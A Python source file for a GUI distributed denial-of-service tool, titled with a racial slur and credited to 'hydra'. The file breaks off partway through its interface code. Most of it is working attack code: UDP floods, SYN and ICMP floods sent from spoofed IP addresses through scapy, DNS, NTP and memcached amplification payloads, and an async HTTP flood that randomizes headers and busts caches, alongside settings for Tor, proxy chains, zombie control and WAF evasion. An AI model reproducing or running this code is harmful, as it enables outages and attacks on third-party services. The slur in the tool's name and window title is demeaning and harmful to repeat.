#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║              DDOS NIGGA - ULTIMATE POWER EDITION                  ║
║                   2PAC - ALL EYEZ ON ME                           ║
║              MEGA MULTI-LAYER ATTACK FRAMEWORK                    ║
║                         PURPLE EDITION                            ║
║                         Made by hydra                             ║
╚═══════════════════════════════════════════════════════════════════╝

POWER LEVELS: OVER 9000!!!
CAPABILITIES:
├── MEGA THREADING: 10,000+ threads simultaneously
├── KERNEL BYPASS: Raw sockets, SYN cookies, IP spoofing
├── AMPLIFICATION: DNS (50x), NTP (200x), Memcached (1000x)
├── BROWSER EMULATION: 10,000+ User-Agents, Cookies, Real Headers
├── PROXY CHAINING: HTTP/SOCKS4/SOCKS5 + TOR + VPN
├── DISTRIBUTED MODE: Control multiple zombies
├── AUTO SCALING: Adaptive based on target response
└── CLOUDFLARE BYPASS: WAF evasion, CAPTCHA solving
"""

import tkinter as tk
from tkinter import ttk, messagebox, font
import threading
import asyncio
import aiohttp
import aiohttp_socks
import socket
import random
import time
import os
import sys
import json
import hashlib
import base64
import urllib.parse
import requests
import multiprocessing
import ctypes
import struct
import ipaddress
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from collections import deque
import platform
import subprocess

# Purple colors
PURPLE_DARK = "#4B0082"
PURPLE_MEDIUM = "#6A0DAD"
PURPLE_LIGHT = "#9370DB"
BLACK = "#000000"
DARK_GRAY = "#1A1A1A"
WHITE = "#FFFFFF"
GREEN = "#00FF00"
RED = "#FF0000"

# ============================================================================
# OPTIONAL LIBRARIES
# ============================================================================

try:
    import psutil
    PSUTIL_AVAILABLE = True
except:
    PSUTIL_AVAILABLE = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, IGMP, send, RandIP, RandMAC, fragment, conf
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest
    SCAPY_AVAILABLE = True
    conf.verb = 0
    conf.use_pcap = True
except:
    SCAPY_AVAILABLE = False

# IMPORTANT: Fixed PIL imports with ImageFont
try:
    from PIL import Image, ImageTk, ImageDraw, ImageFilter, ImageEnhance, ImageFont
    PIL_AVAILABLE = True
    print("✅ PIL loaded successfully - Tupac image will be displayed")
except ImportError as e:
    print(f"⚠️ PIL not fully available: {e}")
    print("   Install with: pip install Pillow")
    PIL_AVAILABLE = False

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except:
    NUMPY_AVAILABLE = False

# ============================================================================
# SYSTEM OPTIMIZATIONS
# ============================================================================

def optimize_system_power():
    """Applies extreme system optimizations"""
    if platform.system() == "Windows":
        try:
            subprocess.run('netsh int tcp set global autotuninglevel=normal', shell=True)
            subprocess.run('netsh int tcp set global rss=enabled', shell=True)
            subprocess.run('netsh int tcp set global chimney=enabled', shell=True)
            subprocess.run('netsh int ipv4 set dynamicport tcp start=1024 num=64511', shell=True)
        except:
            pass
    
    elif platform.system() == "Linux":
        try:
            with open('/proc/sys/net/core/rmem_max', 'w') as f: f.write('134217728')
            with open('/proc/sys/net/core/wmem_max', 'w') as f: f.write('134217728')
            with open('/proc/sys/net/ipv4/tcp_rmem', 'w') as f: f.write('4096 87380 134217728')
            with open('/proc/sys/net/ipv4/tcp_wmem', 'w') as f: f.write('4096 65536 134217728')
        except:
            pass

# ============================================================================
# POWER CONFIGURATION
# ============================================================================

@dataclass
class PowerConfig:
    target: str
    port: int = 80
    target_type: str = 'ip'
    duration: int = 60
    cores: int = multiprocessing.cpu_count()
    threads_per_core: int = 200
    processes: int = 4
    power_level: int = 100
    packet_size: int = 65000
    flood_speed: str = 'extreme'
    method: str = 'apocalypse'
    use_amplification: bool = True
    amplification_types: list = None
    use_proxies: bool = True
    proxy_chain_length: int = 3
    use_tor: bool = True
    tor_chains: int = 2
    ip_spoofing: bool = True
    mac_spoofing: bool = True
    random_ports: bool = True
    ssl: bool = False
    random_agents: bool = True
    user_agents_count: int = 10000
    use_cookies: bool = True
    use_referers: bool = True
    cache_bypass: bool = True
    cloudflare_bypass: bool = True
    waf_evasion: bool = True
    use_raw_sockets: bool = True
    use_syn_flood: bool = True
    use_udp_flood: bool = True
    use_icmp_flood: bool = True
    use_fragmentation: bool = True
    distributed_mode: bool = False
    zombie_file: str = None
    controller_port: int = 31337
    kernel_optimize: bool = True
    high_priority: bool = True
    verbose: bool = True
    ipv6: bool = False
    
    @property
    def total_threads(self) -> int:
        return self.cores * self.threads_per_core * self.processes
    
    @property
    def total_power(self) -> str:
        threads = self.total_threads
        if threads < 1000: return "MEDIUM"
        elif threads < 5000: return "HIGH"
        elif threads < 10000: return "EXTREME"
        else: return "🔥 NUCLEAR 🔥"

class PowerStatistics:
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.requests_sent = 0
        self.connections = 0
        self.errors = 0
        self.successful = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.rps_history = deque(maxlen=60)
        self.bandwidth_history = deque(maxlen=60)
        self.thread_stats = {}
        
    def update(self, bytes_count=0, error=False, success=True, thread_id=0):
        with self.lock:
            self.packets_sent += 1
            self.requests_sent += 1
            self.bytes_sent += bytes_count
            if error:
                self.errors += 1
            if success:
                self.successful += 1
            
            if thread_id not in self.thread_stats:
                self.thread_stats[thread_id] = {'sent': 0, 'errors': 0}
            self.thread_stats[thread_id]['sent'] += 1
            if error:
                self.thread_stats[thread_id]['errors'] += 1
    
    def get_rps(self):
        elapsed = time.time() - self.start_time
        return self.requests_sent / elapsed if elapsed > 0 else 0
    
    def get_bandwidth(self):
        elapsed = time.time() - self.start_time
        return (self.bytes_sent * 8) / elapsed if elapsed > 0 else 0
    
    def get_power_stats(self):
        elapsed = time.time() - self.start_time
        rps = self.get_rps()
        bandwidth = self.get_bandwidth()
        mb_sent = self.bytes_sent / (1024 * 1024)
        gb_sent = mb_sent / 1024
        success_rate = (self.successful / self.requests_sent * 100) if self.requests_sent > 0 else 0
        
        return {
            'rps': f"{rps:,.0f}",
            'bandwidth': f"{bandwidth/1e6:.2f}",
            'data_mb': f"{mb_sent:.2f}",
            'data_gb': f"{gb_sent:.2f}",
            'packets': f"{self.packets_sent:,}",
            'requests': f"{self.requests_sent:,}",
            'success': f"{success_rate:.1f}",
            'errors': f"{self.errors:,}"
        }

# ============================================================================
# MEGA USER-AGENT GENERATOR
# ============================================================================

class MegaUserAgentGenerator:
    @classmethod
    def generate_massive_list(cls, count=10000):
        agents = []
        
        for i in range(2000):
            chrome_version = random.randint(90, 122)
            build = random.randint(4000, 5500)
            patch = random.randint(0, 999)
            agents.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.{build}.{patch} Safari/537.36")
        
        for i in range(1500):
            ff_version = random.randint(100, 123)
            agents.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{ff_version}.0) Gecko/20100101 Firefox/{ff_version}.0")
        
        for i in range(1000):
            edge_version = random.randint(100, 120)
            agents.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{edge_version}.0.0.0 Safari/537.36 Edg/{edge_version}.0.0.0")
        
        for i in range(1000):
            mac_version = f"10_{random.randint(13,15)}_{random.randint(0,7)}"
            safari_version = f"{random.randint(15,17)}_0"
            agents.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X {mac_version}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_version} Safari/605.1.15")
        
        for i in range(1000):
            chrome_version = random.randint(90, 122)
            agents.append(f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36")
        
        for i in range(1500):
            android_version = random.randint(10, 14)
            chrome_version = random.randint(90, 122)
            agents.append(f"Mozilla/5.0 (Linux; Android {android_version}; SM-G{random.randint(900,999)}B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36")
        
        for i in range(1000):
            ios_version = f"{random.randint(14,17)}_{random.randint(0,5)}"
            agents.append(f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_version.split('_')[0]}.0 Mobile/15E148 Safari/604.1")
        
        bots = [
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
            "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            "Twitterbot/1.0",
            "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
            "Discordbot/2.0 (+https://discordapp.com)",
            "TelegramBot (like TwitterBot)"
        ]
        agents.extend(bots * 50)
        
        for i in range(500):
            agents.append(f"Mozilla/5.0 (compatible; CustomBot/{random.randint(1,10)}; +http://example.com/bot)")
        
        return agents[:count]

# ============================================================================
# NUCLEAR PAYLOAD GENERATOR
# ============================================================================

class NuclearPayloadGenerator:
    USER_AGENTS = MegaUserAgentGenerator.generate_massive_list(10000)
    
    REFERERS = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://search.yahoo.com/",
        "https://duckduckgo.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.instagram.com/",
        "https://www.linkedin.com/",
        "https://www.reddit.com/",
        "https://www.youtube.com/",
        "https://www.amazon.com/",
        "https://www.wikipedia.org/",
        "https://www.github.com/",
        "https://stackoverflow.com/",
        "https://medium.com/",
    ]
    
    ACCEPT_TYPES = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "application/json, text/plain, */*",
    ]
    
    LANGUAGES = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "pt-BR,pt;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "it-IT,it;q=0.9,en;q=0.8",
        "ru-RU,ru;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
    ]
    
    @classmethod
    def random_ip(cls):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    @classmethod
    def random_mac(cls):
        return ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
    
    @classmethod
    def random_cookie(cls):
        cookies = []
        for _ in range(random.randint(1, 5)):
            name = random.choice(["session", "user", "id", "token", "auth", "sid", "csrf", "PHPSESSID", "JSESSIONID"])
            value = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
            cookies.append(f"{name}={value}")
        return "; ".join(cookies)
    
    @classmethod
    def random_headers(cls, use_proxy=True):
        headers = {
            "User-Agent": random.choice(cls.USER_AGENTS),
            "Accept": random.choice(cls.ACCEPT_TYPES),
            "Accept-Language": random.choice(cls.LANGUAGES),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": random.choice(["keep-alive", "close"]),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "same-site", "cross-site"]),
            "Sec-Fetch-User": "?1",
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
            "Pragma": "no-cache",
        }
        
        if random.random() > 0.7:
            headers["Referer"] = random.choice(cls.REFERERS)
        
        if random.random() > 0.5:
            headers["Cookie"] = cls.random_cookie()
        
        if use_proxy and random.random() > 0.3:
            headers["X-Forwarded-For"] = cls.random_ip()
            headers["X-Real-IP"] = cls.random_ip()
            headers["X-Originating-IP"] = cls.random_ip()
        
        return headers
    
    @classmethod
    def random_path(cls, base_url):
        paths = ["", "api", "v1", "v2", "v3", "wp-content", "images", "assets", 
                "css", "js", "static", "content", "media", "files", "docs",
                "download", "upload", "admin", "login", "user", "profile"]
        
        extensions = [".php", ".html", ".htm", ".asp", ".aspx", ".jsp", ".do", 
                     ".action", ".json", ".xml", ""]
        
        path_parts = []
        for _ in range(random.randint(0, 3)):
            path_parts.append(random.choice(paths))
        
        if random.random() > 0.5:
            filename = "index" + random.choice(extensions)
            path_parts.append(filename)
        
        path = "/".join(path_parts)
        
        if random.random() > 0.3:
            cache_buster = f"_{int(time.time())}_{random.randint(1000,9999)}"
            path += f"?cb={cache_buster}"
        
        if base_url.endswith('/'):
            return base_url[:-1] + '/' + path.lstrip('/')
        return base_url + '/' + path.lstrip('/')
    
    @classmethod
    def generate_tcp_syn_packet(cls, target_ip, target_port, count=100):
        if not SCAPY_AVAILABLE:
            return None
        
        packets = []
        for _ in range(count):
            ip = IP(src=RandIP(), dst=target_ip)
            tcp = TCP(sport=random.randint(1024,65535), dport=target_port, 
                     flags='S', seq=random.randint(0,4294967295),
                     window=random.randint(1024,65535))
            packets.append(ip/tcp)
        return packets
    
    @classmethod
    def generate_udp_packet(cls, size=65000):
        return random._urandom(size)
    
    @classmethod
    def generate_dns_amplification(cls):
        return b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07isc\x03org\x00\x00\xff\x00\x01'
    
    @classmethod
    def generate_ntp_amplification(cls):
        return b'\x17\x00\x03\x2a' + b'\x00' * 4
    
    @classmethod
    def generate_memcached_amplification(cls):
        return b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'

# ============================================================================
# NUCLEAR L3 ATTACK MODULE
# ============================================================================

class NuclearL3Attack:
    def __init__(self, config: PowerConfig, stats: PowerStatistics, log_callback=None):
        self.config = config
        self.stats = stats
        self.log = log_callback
        self.running = True
        self.sockets = []
        self.raw_socket = None
        self._init_power_sockets()
    
    def log_message(self, msg):
        if self.log:
            self.log(msg)
    
    def _init_power_sockets(self):
        af_type = socket.AF_INET6 if self.config.ipv6 else socket.AF_INET
        
        if self.config.use_raw_sockets:
            try:
                if platform.system() == "Windows":
                    self.raw_socket = socket.socket(af_type, socket.SOCK_RAW, socket.IPPROTO_RAW)
                else:
                    self.raw_socket = socket.socket(af_type, socket.SOCK_RAW, socket.IPPROTO_RAW)
                self.raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                self.log_message("✅ Raw socket created")
            except Exception as e:
                self.log_message(f"⚠️ Raw socket not available: {e}")
        
        socket_count = min(self.config.cores * 10, 100)
        for i in range(socket_count):
            try:
                sock = socket.socket(af_type, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                self.sockets.append(sock)
            except:
                pass
        
        self.log_message(f"✅ {len(self.sockets)} UDP sockets created")
    
    def stop(self):
        self.running = False
        if self.raw_socket:
            try: self.raw_socket.close() 
            except: pass
        for sock in self.sockets:
            try: sock.close() 
            except: pass
    
    def udp_mega_flood(self, thread_id=0):
        packet = NuclearPayloadGenerator.generate_udp_packet(self.config.packet_size)
        packet_count = 0
        start_time = time.time()
        
        while self.running:
            for sock in self.sockets:
                try:
                    for _ in range(10):
                        sock.sendto(packet, (self.config.target, self.config.port))
                        packet_count += 10
                    self.stats.update(bytes_count=len(packet) * 10, thread_id=thread_id)
                except:
                    pass
                
                if packet_count > 100000:
                    elapsed = time.time() - start_time
                    target = 1000000 * (self.config.power_level / 100)
                    actual = packet_count / elapsed if elapsed > 0 else 0
                    
                    if actual > target * 1.1:
                        time.sleep(0.0001)
                    
                    packet_count = 0
                    start_time = time.time()
    
    def syn_nuclear_flood(self, thread_id=0):
        if not SCAPY_AVAILABLE:
            return
        
        while self.running:
            try:
                packets = NuclearPayloadGenerator.generate_tcp_syn_packet(
                    self.config.target, self.config.port, 1000
                )
                if packets:
                    send(packets, verbose=0, realtime=False)
                    self.stats.update(bytes_count=len(packets) * 40, thread_id=thread_id)
            except:
                pass
    
    def icmp_apocalypse(self, thread_id=0):
        if not SCAPY_AVAILABLE:
            return
        
        while self.running:
            try:
                if self.config.ipv6:
                    packet = IPv6(dst=self.config.target)/ICMPv6EchoRequest(data=random._urandom(1400))
                else:
                    packet = IP(src=RandIP(), dst=self.config.target)/ICMP(type=8)/random._urandom(1400)
                
                send(packet, verbose=0, count=100, inter=0)
                self.stats.update(bytes_count=1400 * 100, thread_id=thread_id)
            except:
                pass

# ============================================================================
# NUCLEAR L7 ATTACK MODULE
# ============================================================================

class NuclearL7Attack:
    def __init__(self, config: PowerConfig, stats: PowerStatistics, log_callback=None):
        self.config = config
        self.stats = stats
        self.log = log_callback
        self.running = True
        self.protocol = "https" if config.ssl else "http"
        
        if config.target_type == 'url':
            self.base_url = config.target
        elif config.target_type == 'domain':
            self.base_url = f"{self.protocol}://{config.target}"
            if config.port not in [80, 443]:
                self.base_url += f":{config.port}"
        else:
            self.base_url = f"{self.protocol}://{config.target}"
            if config.port not in [80, 443]:
                self.base_url += f":{config.port}"
    
    def log_message(self, msg):
        if self.log:
            self.log(msg)
    
    def stop(self):
        self.running = False
    
    async def _nuclear_worker(self, worker_id):
        timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=20)
        
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            use_dns_cache=True,
            force_close=False,
            enable_cleanup_closed=True,
            ssl=False
        )
        
        while self.running:
            try:
                headers = NuclearPayloadGenerator.random_headers(use_proxy=True)
                url = NuclearPayloadGenerator.random_path(self.base_url)
                
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    method = random.choices(
                        ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE'],
                        weights=[70, 20, 5, 3, 1, 1]
                    )[0]
                    
                    if method == 'GET':
                        async with session.get(url, headers=headers, ssl=False) as resp:
                            content = await resp.read()
                            self.stats.update(bytes_count=len(content) + 500, 
                                            success=resp.status < 400,
                                            thread_id=worker_id)
                    
                    elif method == 'POST':
                        data = {f"param{i}": f"value{random.randint(1,999)}" for i in range(random.randint(1,5))}
                        async with session.post(url, headers=headers, data=data, ssl=False) as resp:
                            content = await resp.read()
                            self.stats.update(bytes_count=len(content) + 500 + len(str(data)), 
                                            thread_id=worker_id)
                    
                    else:
                        async with session.request(method, url, headers=headers, ssl=False) as resp:
                            self.stats.update(bytes_count=300, thread_id=worker_id)
                
                if self.config.power_level < 100:
                    await asyncio.sleep((100 - self.config.power_level) / 10000)
                
            except asyncio.TimeoutError:
                self.stats.update(error=True, thread_id=worker_id)
            except aiohttp.ClientError:
                self.stats.update(error=True, thread_id=worker_id)
            except Exception:
                self.stats.update(error=True, thread_id=worker_id)
    
    async def run_nuclear_async(self):
        workers = min(self.config.total_threads, 2000)
        self.log_message(f"🔥 Starting {workers} L7 workers")
        
        tasks = []
        for i in range(workers):
            task = asyncio.create_task(self._nuclear_worker(i))
            tasks.append(task)
        
        await asyncio.sleep(self.config.duration)
        self.running = False
        
        for task in tasks:
            task.cancel()
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    def run(self):
        asyncio.run(self.run_nuclear_async())

# ============================================================================
# GRAPHICAL INTERFACE - DARK PURPLE AND BLACK WITH TUPAC IMAGE
# ============================================================================

class DDoSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("DDOS NIGGA - ULTIMATE POWER EDITION | Made by hydra")
        self.root.geometry("1200x800")
        self.root.configure(bg=BLACK)
        
        # Settings
        self.num_cores = multiprocessing.cpu_count()
        self.max_power = self.num_cores * 200 * 4
        
        self.attack_thread = None
        self.attack_running = False
        self.stats = None
        self.config = None
        self.start_time = None
        
        # Configure styles
        self.setup_styles()
        
        # Create Tupac image
        self.tupac_image = None
        self.create_tupac_image()
        
        # Create widgets
        self.create_widgets()
        self.center_window()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Apply optimizations
        if platform.system() == "Windows":
            self.set_high_priority()
    
    def setup_styles(self):
        """Configure styles for purple theme"""
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('Purple.TLabel', 
                       background=BLACK, 
                       foreground=PURPLE_LIGHT,
                       font=('Arial', 10, 'bold'))
        
        style.configure('Purple.TFrame', 
                       background=PURPLE_DARK)
        
        style.configure('Purple.TLabelframe',
                       background=BLACK,
                       foreground=PURPLE_LIGHT)
        
        style.configure('Purple.TLabelframe.Label',
                       background=BLACK,
                       foreground=PURPLE_LIGHT,
                       font=('Arial', 10, 'bold'))
        
        style.configure('Purple.TCombobox',
                       fieldbackground=DARK_GRAY,
                       background=DARK_GRAY,
                       foreground=WHITE,
                       arrowcolor=PURPLE_LIGHT)
    
    def set_high_priority(self):
        try:
            import psutil
            p = psutil.Process()
            p.nice(psutil.HIGH_PRIORITY_CLASS)
        except:
            pass
    
    def create_tupac_image(self):
        """Create Tupac image programmatically"""
        if not PIL_AVAILABLE:
            print("⚠️ PIL not available - skipping Tupac image")
            return
        
        try:
            # Create a purple-tinted image
            img = Image.new('RGB', (1200, 800), color=(20, 10, 30))  # Dark purple background
            
            # Create drawing context
            draw = ImageDraw.Draw(img)
            
            # Try to load a font, fallback to default if not available
            try:
                font_large = ImageFont.truetype("arial.ttf", 60)
                font_medium = ImageFont.truetype("arial.ttf", 40)
                font_small = ImageFont.truetype("arial.ttf", 20)
            except:
                font_large = ImageFont.load_default()
                font_medium = ImageFont.load_default()
                font_small = ImageFont.load_default()
            
            # Draw 2PAC silhouette/stylized text
            draw.text((500, 200), "2PAC", fill=(100, 0, 150), font=font_large)
            draw.text((480, 280), "ALL EYEZ", fill=(120, 50, 180), font=font_medium)
            draw.text((520, 340), "ON ME", fill=(140, 80, 200), font=font_medium)
            
            # Draw some decorative elements
            # Crown
            draw.polygon([(550, 100), (600, 50), (650, 100)], fill=(150, 0, 200), outline=(200, 100, 255))
            
            # Bandana effect
            draw.rectangle([450, 380, 750, 420], fill=(80, 20, 120))
            
            # Cigarette
            draw.rectangle([680, 380, 730, 400], fill=(150, 150, 150))
            draw.rectangle([730, 385, 750, 395], fill=(200, 200, 100))
            draw.ellipse([748, 387, 752, 393], fill=(255, 50, 50))
            
            # Add some "thug life" text
            draw.text((500, 450), "THUG LIFE", fill=(180, 100, 220), font=font_medium)
            
            # Add "Made by hydra" credit on the image
            draw.text((900, 700), "by hydra", fill=(150, 100, 200), font=font_small)
            
            # Apply purple filter using numpy if available
            if NUMPY_AVAILABLE:
                img_array = np.array(img)
                # Enhance purple tones
                img_array[:,:,0] = img_array[:,:,0] * 0.8  # Reduce red
                img_array[:,:,2] = img_array[:,:,2] * 1.3  # Increase blue (purple)
                img_array = np.clip(img_array, 0, 255).astype(np.uint8)
                img = Image.fromarray(img_array)
            
            # Convert to PhotoImage for tkinter
            self.tupac_image = ImageTk.PhotoImage(img)
            print("✅ Tupac image created successfully")
            
        except Exception as e:
            print(f"⚠️ Error creating Tupac image: {e}")
            self.tupac_image = None
    
    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def create_widgets(self):
        # Canvas for background image
        self.canvas = tk.Canvas(self.root, width=1200, height=800, 
                                highlightthickness=0, bg=BLACK)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        # Tupac image as background
        if self.tupac_image:
            self.canvas.create_image(0, 0, image=self.tupac_image, anchor=tk.NW)
            # Add a semi-transparent overlay to make text readable
            overlay = self.canvas.create_rectangle(0, 0, 1200, 800, 
                                                  fill=BLACK, stipple="gray50")
            self.canvas.tag_lower(overlay, "all")
        else:
            # Fallback if no image - solid purple gradient
            for i in range(800):
                purple_shade = int(20 + (i/800) * 30)
                color = f'#{purple_shade:02x}00{min(255, purple_shade*2):02x}'
                self.canvas.create_line(0, i, 1200, i, fill=color)
        
        # Main frame (semi-transparent background)
        main_frame = tk.Frame(self.root, bg=PURPLE_DARK, bd=3, relief=tk.RIDGE)
        main_frame.place(relx=0.5, rely=0.5, anchor='center', width=1150, height=750)
        
        # Title with purple effect
        title_frame = tk.Frame(main_frame, bg=PURPLE_DARK)
        title_frame.pack(pady=10)
        
        title_label = tk.Label(title_frame, text="🔥 DDOS NIGGA 🔥", 
                              font=('Impact', 48, 'bold'),
                              fg=PURPLE_LIGHT, bg=PURPLE_DARK)
        title_label.pack()
        
        subtitle = tk.Label(title_frame, text="2PAC - ALL EYEZ ON ME | POWER EDITION | Made by hydra", 
                          font=('Arial', 14), fg=PURPLE_LIGHT, bg=PURPLE_DARK)
        subtitle.pack()
        
        # Main controls container (divided into columns)
        controls_container = tk.Frame(main_frame, bg=PURPLE_DARK)
        controls_container.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        
        # Left column - Main inputs
        left_frame = tk.Frame(controls_container, bg=BLACK, bd=2, relief=tk.SUNKEN)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        tk.Label(left_frame, text="⚙️ MAIN CONFIGURATIONS ⚙️", 
                font=('Arial', 14, 'bold'), fg=PURPLE_LIGHT, bg=BLACK).pack(pady=10)
        
        # IP TYPE
        self.create_label(left_frame, "IP TYPE:")
        self.ip_type = ttk.Combobox(left_frame, values=["IPv4", "IPv6", "IPv4+IPv6 (Dual)"],
                                   style='Purple.TCombobox', font=('Arial', 11), state="readonly")
        self.ip_type.set("IPv4")
        self.ip_type.pack(pady=5)
        
        # IP / DOMAIN
        self.create_label(left_frame, "IP / DOMAIN / URL:")
        self.ip_entry = tk.Entry(left_frame, font=('Arial', 11), width=30,
                                bg=DARK_GRAY, fg=WHITE, 
                                insertbackground=PURPLE_LIGHT,
                                relief=tk.FLAT, bd=3)
        self.ip_entry.pack(pady=5)
        
        # PORT
        self.create_label(left_frame, "PORT:")
        port_frame = tk.Frame(left_frame, bg=BLACK)
        port_frame.pack(pady=5)
        
        self.port_entry = tk.Entry(port_frame, font=('Arial', 11), width=10,
                                  bg=DARK_GRAY, fg=WHITE,
                                  insertbackground=PURPLE_LIGHT)
        self.port_entry.insert(0, "80")
        self.port_entry.pack(side=tk.LEFT, padx=5)
        
        self.ssl_var = tk.BooleanVar()
        ssl_check = tk.Checkbutton(port_frame, text="SSL/HTTPS", variable=self.ssl_var,
                                   bg=BLACK, fg=PURPLE_LIGHT, 
                                   selectcolor=PURPLE_DARK,
                                   activebackground=PURPLE_DARK)
        ssl_check.pack(side=tk.LEFT, padx=5)
        
        # DURATION
        self.create_label(left_frame, "ATTACK DURATION (SECONDS):")
        self.duration_entry = tk.Entry(left_frame, font=('Arial', 11), width=15,
                                      bg=DARK_GRAY, fg=WHITE,
                                      insertbackground=PURPLE_LIGHT)
        self.duration_entry.insert(0, "60")
        self.duration_entry.pack(pady=5)
        
        # TARGET TYPE
        self.create_label(left_frame, "TARGET TYPE:")
        self.target_type = ttk.Combobox(left_frame, values=["IP", "DOMAIN", "URL", "SERVER"],
                                       style='Purple.TCombobox', font=('Arial', 11), state="readonly")
        self.target_type.set("IP")
        self.target_type.pack(pady=5)
        
        # ATTACK TYPE
        self.create_label(left_frame, "ATTACK TYPE:")
        self.attack_type = ttk.Combobox(left_frame,
                                       values=[
                                           "🔥 APOCALYPSE (ALL VECTORS)",
                                           "💀 NUCLEAR (L3 + L7)",
                                           "🌐 LAYER 3/4 (NETWORK)",
                                           "🌍 LAYER 7 (APPLICATION)",
                                           "📡 AMPLIFICATION (DNS/NTP/MEMCACHED)",
                                           "⚡ TCP SYN FLOOD",
                                           "💧 UDP FLOOD",
                                           "🔥 HTTP/HTTPS FLOOD",
                                           "🐌 SLOWLORIS",
                                           "💀 ICMP FLOOD (PING)"
                                       ],
                                       style='Purple.TCombobox', font=('Arial', 11), 
                                       state="readonly", width=30)
        self.attack_type.set("🔥 APOCALYPSE (ALL VECTORS)")
        self.attack_type.pack(pady=5)
        
        # Middle column - Power and Performance
        mid_frame = tk.Frame(controls_container, bg=BLACK, bd=2, relief=tk.SUNKEN)
        mid_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        tk.Label(mid_frame, text="⚡ POWER & PERFORMANCE ⚡", 
                font=('Arial', 14, 'bold'), fg=PURPLE_LIGHT, bg=BLACK).pack(pady=10)
        
        # POWER LEVEL
        self.create_label(mid_frame, "POWER LEVEL:")
        power_frame = tk.Frame(mid_frame, bg=BLACK)
        power_frame.pack(pady=5)
        
        self.power_scale = tk.Scale(power_frame, from_=1, to=100, orient=tk.HORIZONTAL,
                                   length=200, bg=BLACK, fg=PURPLE_LIGHT,
                                   troughcolor=PURPLE_DARK, 
                                   activebackground=PURPLE_MEDIUM,
                                   highlightbackground=PURPLE_DARK)
        self.power_scale.set(100)
        self.power_scale.pack(side=tk.LEFT)
        
        self.power_value = tk.Label(power_frame, text="100%", font=('Arial', 12, 'bold'),
                                   fg=PURPLE_LIGHT, bg=BLACK)
        self.power_value.pack(side=tk.LEFT, padx=5)
        self.power_scale.config(command=lambda v: self.power_value.config(text=f"{v}%"))
        
        # CPU CORES
        self.create_label(mid_frame, f"AVAILABLE CORES: {self.num_cores}")
        cores_frame = tk.Frame(mid_frame, bg=BLACK)
        cores_frame.pack(pady=5)
        
        tk.Label(cores_frame, text="USE CORES:", fg=PURPLE_LIGHT, 
